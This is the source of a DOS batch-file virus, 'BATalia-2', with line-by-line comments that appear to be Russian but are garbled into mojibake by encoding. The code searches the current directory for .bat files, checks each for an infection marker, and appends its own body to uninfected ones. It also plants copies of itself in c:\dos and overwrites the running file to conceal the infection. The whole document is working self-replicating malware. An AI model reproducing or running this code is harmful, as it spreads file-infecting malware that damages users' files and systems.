@echo off ; �� AKA "����������� ������" �몫�祭�
rem YYY  ; ���  ����� 
if "%1"=="2" goto s ; �᫨ �맢 � � � � ���஬ 2 � ᮡ᭮ ��� ���稪
for %%b in (*.bat) do call %0 2 %%b  ; ��ॡ�� ��� � ⭨��� � ⥪�饬 � � ����
  ; � �᫨ � ���� ��� ����, � �맮� ᥡ� �� � � � ���� �� [2] � [��� � ⭨� ]
goto b ; ����� ��ॡ��  -  �� �� �� ������ � � ������ �ண� ���   
:s   ; � � �� ��� ���稪 
copy %2 p>l  ; ᪮��஢ �� � ������ � ⭨� � p
echo NNN>>p  ; ��� ���� � ����� p ��ப� NNN
echo 1>z1    ; ᮧ� �� � �� z1 � ��ப�� 1
echo 2>z2    ; ᮧ� �� � �� z2 � ��ப�� 2
echo 3>z3    ; ᮧ� �� � �� z3 � ��ப�� 3
del z?/p<p>l  ; �ந�室�� � ����� ᮧ� ���� 3 � ����, �  �᭮�� 
 ; ���� 樨, ����祭��� �� � �������� � ⭨�  (� � �쭥�襬 - � ⭨� )
 ; �᫨ � ⭨� 㦥 � � ��� � �� - � �ந������ � ����� ��� � ���� -
 ; ( ��ப  YYY � � � �� �����  ) - �᫨ � ⥫� � ⭨�  ��� �㦭�� �㪢
 ; N ��� Y - � ��ப  NNN ��� ����� � � �� � ����� � ⭨�  �� � �� 
 ; � ����� ��� ��� DEL � ���� ��� � � �� �  �� �� ����. 
if exist z? goto i ; �᫨ ������� ��� ���� � �� Z? - � � ⭨�
 ; �� � � ��� ����ᮬ � ���⮬� �������� � � �����.
goto e   ; �᫨ ���� � ⭨� 㦥 � ����ᮬ - ��୥��� � ��ॡ���.
:i    ; ��楤��  � � �����
type %0>b  ; ᪮��஢ �� ���� ����� (�� � ��  0A) � � �� b
copy b a/a>l  ; ᪮��஢ �� ���� ����� � � �� a � ��� ������� 0A � �����
copy %2 t>l   ; ᪮��஢ �� � ⭨� � � �� t
copy /ba+t %2>l  ; ᪮��஢ �� ����� � 0A + t � � ⭨� (�������� � � � ��) 
goto e    ; �த������ ��ॡ��
:b   ; ��楤��  ��। � �� ������ �� ன (� 襩) �ண�
echo rem              >x ; ��� �� � �� x � ��ப�� rem, �஡�� �� � ���஬  
copy x+x+x+x y>l   ; � �� y 㦥 �㤥� ᮤ�� �� 4 rem` , �஡��� � 4 ���� 
copy y+y+y+y+y+y z>l  ; � �� z �㤥� ᮤ�� �� 24 rem`a, �஡��� � 24 ���� 
echo @%%comspec%% nul /ccopy c:\dos\y %%0>>z ; � ����� � ��  z ��� ������
 ; ���᫥���� � ��ப  
copy z c:\dos\x>l ; � ��� � �� z - ��������� � c:\dos\x
copy %0 c:\dos\y>l ;   � �  (�ᯮ��塞 �) �ண  � c:\dos\y
del ??>l  ; � �塞 �� �஬������ � ���
echo on ; �� ����祭�
@copy c:\dos\x %0>nul  ; ---------
:e                              ; |
rem BATalia-2 Int O`Dream SG    ; |
                                ; <
;  ����p���� � � c:\dos\x AKA z � ⥪�騩 bat���
;  � � 稭 �� �ᯮ����� ����� :e � �.�.
;  � ��p�窮� @%comspec% nul /ccopy c:\dos\y %0
;  � ��� ���� ����� ���� �� ���  - �  ���� ��� ��� - ����஢ ���
;  ( nul - �� �⮡� ��祣� �  ��� � �� ��� �� ��.)
;   � ᮮ⢥�᭮ c:\dos\y �ॢ� � ���� � %0,
;  � ���� ����� � ���� �� � � � ⭨�
;  � ���� ��� � ⮬:
;  � ���� � 襣� ��p��  �⮨� 1A - ����� TXT � �� .
;  ����  �ᯮ������ bat��� � �p� ���p�� 1A ��
;  � � �稢 �� p ����. H� � � �� � �� �ᯮ����� � p �����
;  � �� � ��ᥬ� � ��p�宦� �� 1A ��� ��� �ᯮ������.
;  �� ��� ���� � ��� ��p ���:
;  �ᯮ������ bat���, � ��p�, �pאַ ��p�� �ᯮ������ 1A
;  ��� � ������ �  �p㣮�,⮫쪮 �� ᮧ� ���,
;  � ��� �� ����� 1A ��� �� copy [��p ����� bat���] [⥪�騩 bat���]
;  � ���� ����p�� �� p�, ��p ����� �p��� p�⥫쭮 bat���
;  ��p ⭮ � �� � 稭 �� �ᯮ����� � ���, �p����⨢ 1A.
;  ��᫥��� ⥫쭮��� �ᯮ��塞�� ��� ��:
;  copy c:\dos\x %0 >nul
;  copy c:\dos\y %0 [ ��� nul ]
;  �p���� �쭮� ⥫� � p ������� bat��� 
;  �p����⨢ :e,rem BATalia-2 Int .... ,1A.




